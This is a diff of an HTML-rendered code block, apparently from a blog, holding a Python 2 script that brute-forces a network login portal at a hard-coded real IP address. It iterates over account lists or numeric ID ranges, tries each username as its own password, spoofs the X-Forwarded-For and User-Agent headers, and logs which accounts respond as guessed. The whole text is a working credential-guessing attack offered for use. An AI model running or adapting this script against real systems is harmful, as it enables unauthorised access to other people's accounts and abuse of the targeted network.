@@ -171,279 +171,97 @@
 <span class='line-number'>90</span>
 <span class='line-number'>91</span>
 <span class='line-number'>92</span>
-<span class='line-number'>93</span>
-<span class='line-number'>94</span>
-<span class='line-number'>95</span>
-<span class='line-number'>96</span>
-<span class='line-number'>97</span>
-<span class='line-number'>98</span>
-<span class='line-number'>99</span>
-<span class='line-number'>100</span>
-<span class='line-number'>101</span>
-<span class='line-number'>102</span>
-<span class='line-number'>103</span>
-<span class='line-number'>104</span>
-<span class='line-number'>105</span>
-<span class='line-number'>106</span>
-<span class='line-number'>107</span>
-<span class='line-number'>108</span>
-<span class='line-number'>109</span>
-<span class='line-number'>110</span>
-<span class='line-number'>111</span>
-<span class='line-number'>112</span>
-<span class='line-number'>113</span>
-<span class='line-number'>114</span>
-<span class='line-number'>115</span>
-<span class='line-number'>116</span>
-<span class='line-number'>117</span>
-<span class='line-number'>118</span>
-<span class='line-number'>119</span>
-<span class='line-number'>120</span>
-<span class='line-number'>121</span>
-<span class='line-number'>122</span>
-<span class='line-number'>123</span>
-<span class='line-number'>124</span>
-<span class='line-number'>125</span>
-<span class='line-number'>126</span>
-<span class='line-number'>127</span>
-<span class='line-number'>128</span>
-<span class='line-number'>129</span>
-<span class='line-number'>130</span>
-<span class='line-number'>131</span>
-<span class='line-number'>132</span>
-<span class='line-number'>133</span>
-<span class='line-number'>134</span>
-<span class='line-number'>135</span>
-<span class='line-number'>136</span>
-<span class='line-number'>137</span>
-<span class='line-number'>138</span>
-<span class='line-number'>139</span>
-<span class='line-number'>140</span>
-<span class='line-number'>141</span>
-<span class='line-number'>142</span>
-<span class='line-number'>143</span>
-<span class='line-number'>144</span>
-<span class='line-number'>145</span>
-<span class='line-number'>146</span>
-<span class='line-number'>147</span>
-<span class='line-number'>148</span>
-<span class='line-number'>149</span>
-<span class='line-number'>150</span>
-<span class='line-number'>151</span>
-<span class='line-number'>152</span>
-<span class='line-number'>153</span>
-<span class='line-number'>154</span>
-<span class='line-number'>155</span>
-<span class='line-number'>156</span>
-<span class='line-number'>157</span>
-<span class='line-number'>158</span>
-<span class='line-number'>159</span>
-<span class='line-number'>160</span>
-<span class='line-number'>161</span>
-<span class='line-number'>162</span>
-<span class='line-number'>163</span>
-<span class='line-number'>164</span>
-<span class='line-number'>165</span>
-<span class='line-number'>166</span>
-<span class='line-number'>167</span>
-<span class='line-number'>168</span>
-<span class='line-number'>169</span>
-<span class='line-number'>170</span>
-<span class='line-number'>171</span>
-<span class='line-number'>172</span>
-<span class='line-number'>173</span>
-<span class='line-number'>174</span>
-<span class='line-number'>175</span>
-<span class='line-number'>176</span>
-<span class='line-number'>177</span>
-<span class='line-number'>178</span>
-<span class='line-number'>179</span>
-<span class='line-number'>180</span>
-<span class='line-number'>181</span>
-<span class='line-number'>182</span>
-<span class='line-number'>183</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>#! /usr/bin python
-</span><span class='line'>
 </span><span class='line'># encoding: utf-8
 </span><span class='line'>
-</span><span class='line'>
-</span><span class='line'>
 </span><span class='line'>import urllib2
-</span><span class='line'>
 </span><span class='line'>import urllib
-</span><span class='line'>
 </span><span class='line'>import sys
-</span><span class='line'>
 </span><span class='line'>import types
 </span><span class='line'>
-</span><span class='line'>
-</span><span class='line'>
 </span><span class='line'>guess_list = []
-</span><span class='line'>
 </span><span class='line'>server_url = "http://222.174.155.19/"
-</span><span class='line'>
 </span><span class='line'>headers = {'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6',
-</span><span class='line'>
 </span><span class='line'>'X-Forwarded-For':'1.1.1.1'}
 </span><span class='line'>
-</span><span class='line'>
-</span><span class='line'>
 </span><span class='line'>def usage():
-</span><span class='line'>
 </span><span class='line'>print "USAGE 00: python guess.py FILEPATH of account list file,like: python guess.py ./lists.dat"
-</span><span class='line'>
 </span><span class='line'>print "USAGE 01: python guess.py START END like: python guess.py 2009123456 2009145396"
 </span><span class='line'>
-</span><span class='line'>
-</span><span class='line'>
 </span><span class='line'>def Login(username, password):
-</span><span class='line'>
 </span><span class='line'>params = urllib.urlencode({'DDDDD': username, 'upass': password, '0MKKey': "%B5%C7%C2%BC%20Login"})
-</span><span class='line'>
 </span><span class='line'>request = urllib2.Request(url = server_url, data = params, headers = headers)
-</span><span class='line'>
 </span><span class='line'>try:
-</span><span class='line'>
 </span><span class='line'>output = urllib2.urlopen(request, timeout = 3).readlines()
-</span><span class='line'>
 </span><span class='line'>Log(output[5], username, password)
-</span><span class='line'>
 </span><span class='line'>except:
-</span><span class='line'>
 </span><span class='line'>print "timeout!"
-</span><span class='line'>
 </span><span class='line'>global guess_list
-</span><span class='line'>
 </span><span class='line'>guess_list = guess_list[1:]
-</span><span class='line'>
 </span><span class='line'>guess_list.append(username)
 </span><span class='line'>
-</span><span class='line'>
-</span><span class='line'>
 </span><span class='line'>def Logout():
-</span><span class='line'>
 </span><span class='line'>output = urllib2.urlopen(server_url + "F.htm")
 </span><span class='line'>
-</span><span class='line'>
-</span><span class='line'>
 </span><span class='line'>def Log(output,username, password):
-</span><span class='line'>
 </span><span class='line'># "msga='error1'" => can not login in web
-</span><span class='line'>
 </span><span class='line'>result = output.find("msga='error1'")
-</span><span class='line'>
 </span><span class='line'>if result != -1:
-</span><span class='line'>
 </span><span class='line'>print "find one!!!"
-</span><span class='line'>
 </span><span class='line'>f = open("./content.dat", 'a')
-</span><span class='line'>
 </span><span class='line'>f.write(str(username) + '\n')
-</span><span class='line'>
 </span><span class='line'>f.close()
-</span><span class='line'>
 </span><span class='line'>else:
-</span><span class='line'>
 </span><span class='line'>print "pass!"
-</span><span class='line'>
 </span><span class='line'>f = open("./bad.dat",'a')
-</span><span class='line'>
 </span><span class='line'>f.write(str(username) + '\n')
-</span><span class='line'>
 </span><span class='line'>f.close()
-</span><span class='line'>
 </span><span class='line'>#drop first element
-</span><span class='line'>
 </span><span class='line'>global guess_list
-</span><span class='line'>
 </span><span class='line'>guess_list = guess_list[1:]
 </span><span class='line'>
-</span><span class='line'>
-</span><span class='line'>
 </span><span class='line'>def show_result():
-</span><span class='line'>
 </span><span class='line'>print "Result:##########################################"
-</span><span class='line'>
 </span><span class='line'>print "Have Guessed:"
-</span><span class='line'>
 </span><span class='line'>for i in open("./content.dat").readlines():
-</span><span class='line'>
 </span><span class='line'>print i,
-</span><span class='line'>
 </span><span class='line'>print "some accounts can not guessed are in bad.dat"
-</span><span class='line'>
 </span><span class='line'>print "Result:##########################################"
-</span><span class='line'>
-</span><span class='line'>
 </span><span class='line'>
 </span><span class='line'>def get_timeout_list(timeout_file_path):
-</span><span class='line'>
 </span><span class='line'>f = open(timeout_file_path)
-</span><span class='line'>
 </span><span class='line'>global guess_list 
-</span><span class='line'>
 </span><span class='line'>guess_list = f.readlines()
-</span><span class='line'>
 </span><span class='line'>f.close()
 </span><span class='line'>
-</span><span class='line'>
-</span><span class='line'>
 </span><span class='line'>if len(sys.argv) == 2:
-</span><span class='line'>
 </span><span class='line'># itself and only one argv,the path of account list file...
-</span><span class='line'>
 </span><span class='line'>get_timeout_list(sys.argv[1])
-</span><span class='line'>
 </span><span class='line'>elif(len(sys.argv) &lt; 2):
-</span><span class='line'>
 </span><span class='line'>usage()
-</span><span class='line'>
 </span><span class='line'>else:
-</span><span class='line'>
 </span><span class='line'>#start and end account,argv[1] and argv[2]
-</span><span class='line'>
 </span><span class='line'>start = int(sys.argv[1])
-</span><span class='line'>
 </span><span class='line'>end = int(sys.argv[2])
-</span><span class='line'>
 </span><span class='line'>if start > end:
-</span><span class='line'>
 </span><span class='line'>usage()
-</span><span class='line'>
 </span><span class='line'>exit(-1)
-</span><span class='line'>
 </span><span class='line'>else:
-</span><span class='line'>
 </span><span class='line'>guess_list = range(start, end + 1)
-</span><span class='line'>
-</span><span class='line'>
 </span><span class='line'>
 </span><span class='line'>if __name__ == "__main__":
 </span><span class='line'>
-</span><span class='line'>
-</span><span class='line'>
 </span><span class='line'>while True:
-</span><span class='line'>
 </span><span class='line'>for i in guess_list:
-</span><span class='line'>
 </span><span class='line'>#drop last \n or \r
-</span><span class='line'>
 </span><span class='line'>if type(i) == types.StringType:
-</span><span class='line'>
 </span><span class='line'>i = i.rstrip('\n\r')
-</span><span class='line'>
 </span><span class='line'>Logout()
-</span><span class='line'>
 </span><span class='line'>print "Guess: " + str(i)
-</span><span class='line'>
 </span><span class='line'>Login(i, i)
 </span><span class='line'>
-</span><span class='line'>
-</span><span class='line'>
 </span><span class='line'>if len(guess_list) == 0:
-</span><span class='line'>
 </span><span class='line'>break
-</span><span class='line'>
 </span><span class='line'>show_result()</span></code></pre></td></tr></table></div></figure>
 
 
